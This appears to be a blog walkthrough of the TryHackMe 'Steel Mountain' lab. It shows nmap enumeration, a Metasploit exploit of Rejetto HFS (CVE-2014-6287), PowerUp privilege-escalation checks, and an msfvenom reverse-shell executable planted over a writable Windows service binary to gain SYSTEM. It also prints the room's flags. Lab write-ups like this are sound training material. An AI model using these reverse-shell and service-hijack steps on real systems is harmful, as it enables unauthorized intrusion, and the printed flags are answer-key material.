---
layout: post
title: Steel Mountain
categories: [CyberSecurity, CTF]
tags: [thm, easy, nmap]
---
![Steel Mountain](./assets/steelmountain.png){: .right }{: w="200" h="200" }
## Walkthrough
[https://tryhackme.com/room/steelmountain](https://tryhackme.com/room/steelmountain)

**Difficulty level:** Easy

## Task 1: Introduction
In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

If you don't have the right security tools and environment, deploy your own Kali Linux machine and control it in your browser, with our Kali Room.

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.


### Questions

Q1. Deploy the machine. Who is the emplyee of the month?  
Hint: "Reverse image search"

> "Bill Harper"

### MyWalk

nmap scan

```bash
nmap -sV -vv --script vuln 10.10.198.214
```
{: .nolineno }

Found this:

```bash
Try to search for possible vulnerabilities. Found 2:

PORT      STATE SERVICE            REASON  VERSION
80/tcp    open  http               syn-ack Microsoft IIS httpd 8.5
| vulners: 
|   cpe:/a:microsoft:internet_information_services:8.5: 
|_      CVE-2014-4078   5.1     https://vulners.com/cve/CVE-2014-4078
```
{: .nolineno }

And this:

```bash
3389/tcp  open  ssl/ms-wbt-server? syn-ack
| ssl-dh-params: 
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
|             Modulus Type: Safe prime
|             Modulus Source: RFC2409/Oakley Group 2
|             Modulus Length: 1024
|             Generator Length: 1024
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org

```
{: .nolineno }

But no success searching for exploits.

Also trying another scan:

```bash
nmap -T4 -sC -sV -Pn -oN nmap/initial 10.10.198.214
```
{: .nolineno }

I saw port 80 and port 8080 open so visited both pages.
Visiting the IP:80 webpage shows a person image, looking at the image name, we get the Q1 answer.  
On the 8080 port we can see the following:

![Steel Mountain](./assets/steelmountain2.png)


## Task 2: Initial Access

Now you have deployed the machine, lets get an initial shell!

### Questions

Q1.  Scan the machine with nmap. What is the other port running a web server on?

> "8080"

Q2. Take a look at the other web server. What file server is running?

> "Rejetto HTTP File Server"

Q3 What is the CVE number to exploit this file server?

> "2014-6287"

Q4. Use Metasploit to get an initial shell. What is the user flag?

> "��b04763b6fcf51fcd7c13abc7db4fd365"

### MyWalk

After starting the Metasploit and search for "HttpFileServer" we can see listed the "exploit/windows/http/rejetto_hfs_exec".  
Just set the RHOSTS, LPORT as 8080 and LHOST as "tun0" or your tun0 IP and start a meterpreter session.

Q1 is easy. Q2 and Q3 by searching the "HttpFileServer 2.3".  
Q4 by navegating to C:/users/bill/Desktop and see the content of user.txt 

## Task 3: Privilege Escalation

Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root!

### Questions

Q1. To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."

You can download the script [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1).  If you want to download it via the command line, be careful not to download the GitHub page instead of the raw script. Now you can use the upload command in Metasploit to upload the script.

First download the script:

```bash
└─$ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
--2024-01-24 16:38:22--  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 600580 (587K) [text/plain]
Saving to: ‘PowerUp.ps1’

PowerUp.ps1             100%[==============================>] 586.50K  3.02MB/s    in 0.2s    

2024-01-24 16:38:23 (3.02 MB/s) - ‘PowerUp.ps1’ saved [600580/600580]

```
{: .nolineno }

Then upload to target in meterpreter:

```bash
meterpreter > upload PowerUp.ps1
[*] Uploading  : /home/ppmatrix/Desktop/thm/rooms/Steel Mountain/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /home/ppmatrix/Desktop/thm/rooms/Steel Mountain/PowerUp.ps1 -> PowerUp.ps1
[*] Completed  : /home/ppmatrix/Desktop/thm/rooms/Steel Mountain/PowerUp.ps1 -> PowerUp.ps1
meterpreter > dir
Listing: C:\Users\bill\Desktop
==============================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100666/rw-rw-rw-  600580  fil   2024-01-24 16:40:53 -0500  PowerUp.ps1
100666/rw-rw-rw-  282     fil   2019-09-27 07:07:07 -0400  desktop.ini
100666/rw-rw-rw-  70      fil   2019-09-27 08:42:38 -0400  user.txt

```
{: .nolineno }

To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell:

```bash
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > . .\Powerup.ps1
PS > Invoke-AllChecks

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

```
{: .nolineno }

> "No answer needed"

Q2. Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?

> "AdvancedSystemCareService9"

Q3. The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

At this point we need to do the following steps:
1. Generate a payload to to establish a reverse shell  
2. Upload it  
3. replace the legitimate one  
4. Setting up a listener on target machine  
5. Restart the service  
6. Check the listener to connection from target.  
7. Confirm priviledge escalation by whoami command  
8. Get the root flag


Use msfvenom to generate a reverse shell as an Windows executable.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.242.20 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```
{: .nolineno }

Q2. Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.

Note: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.

> "No answer needed"

```bash
meterpreter > upload Advanced.exe
[*] Uploading  : /home/ppmatrix/Desktop/thm/rooms/Steel Mountain/Advanced.exe -> Advanced.exe
[*] Uploaded 15.50 KiB of 15.50 KiB (100.0%): /home/ppmatrix/Desktop/thm/rooms/Steel Mountain/Advanced.exe -> Advanced.exe
[*] Completed  : /home/ppmatrix/Desktop/thm/rooms/Steel Mountain/Advanced.exe -> Advanced.exe
```
{: .nolineno }

Now lets set the listener, at another terminal:

```bash
└─$ msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set LPORT 4443
LPORT => 4443
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => 10.8.242.20
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.242.20:4443 
```
{: .nolineno }

Now lets replace the service binary on previous terminal:

```bash
meterpreter > load powershell
meterpreter > powershell_shell
PS > stop-service AdvancedSystemCareService9
PS > copy Advanced.exe "C:/Program Files (x86)/IObit/Advanced SystemCare/ASCService.exe"
PS > start-service AdvancedSystemCareService9
ERROR: start-service : Failed to start service 'Advanced SystemCare Service 9 (AdvancedSystemCareService9)'.
ERROR: At line:1 char:1
ERROR: + start-service AdvancedSystemCareService9
ERROR: + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],
ERROR:    ServiceCommandException
ERROR:     + FullyQualifiedErrorId : StartServiceFailed,Microsoft.PowerShell.Commands.StartServiceCommand
ERROR:
```
{: .nolineno }

Now checking the Listener...

```bash
[*] Command shell session 1 opened (10.8.242.20:4443 -> 10.10.148.106:49219) at 2024-01-25 13:44:49 -0500

Shell Banner:
Microsoft Windows [Version 6.3.9600]
-----
          
C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd\
cd\
C:\>cd users\administrator\desktop\
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\Administrator\Desktop

10/12/2020  11:05 AM    <DIR>          .
10/12/2020  11:05 AM    <DIR>          ..
10/12/2020  11:05 AM             1,528 activation.ps1
09/27/2019  04:41 AM                32 root.txt
               2 File(s)          1,560 bytes
               2 Dir(s)  44,169,891,840 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
9af5f314f57607c00fd09803a587db80

```
{: .nolineno }


Q3. What is the root flag?

> "9af5f314f57607c00fd09803a587db80"